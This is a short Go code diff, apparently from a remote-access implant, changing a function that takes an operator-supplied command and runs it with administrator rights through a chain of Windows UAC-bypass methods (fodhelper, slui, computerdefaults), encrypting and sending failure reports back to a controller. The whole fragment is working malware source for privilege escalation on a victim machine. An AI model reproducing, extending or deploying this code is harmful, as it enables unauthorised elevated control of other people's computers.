@@ -12,21 +12,30 @@ import (
 	"strings"
 )
 
-func getAdminCmd(sendUserId string) {
-	path, err := util.GetExecPath()
-	fmt.Println(path)
-	args := strings.Join(os.Args[1:], " ")
-	cmd := fmt.Sprintf("%s %s", path, args)
-	if err != nil {
-		return
+func getAdminCmd(sendUserId, decData string) {
+	cmd := decData
+
+	if len(strings.TrimSpace(cmd)) == 0 {
+		path, err := util.GetExecPath()
+		if err != nil {
+			message := fmt.Sprintf("%v", err)
+			data := colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
+			outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
+			common.SendFailMsg(sendUserId, common.ClientId, "getAdmin_ret", outputMsg)
+			return
+		}
+		args := strings.Join(os.Args[1:], " ")
+		cmd = fmt.Sprintf("%s %s", path, args)
 	}
-	err = bypassuac.ExecFodhelper(cmd)
+
+	err := bypassuac.ExecFodhelper(cmd)
 	if err != nil {
 		err = bypassuac.ExecSlui(cmd)
 		if err != nil {
 			err = bypassuac.ExecComputerdefaults(cmd)
 			if err != nil {
-				data := colorcode.OutputMessage(colorcode.SIGN_FAIL, "failed to obtain administrator privileges")
+				message := fmt.Sprintf("failed to obtain administrator privileges: %v", err)
+				data := colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
 				outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
 				common.SendFailMsg(sendUserId, common.ClientId, "getAdmin_ret", outputMsg)
 				return
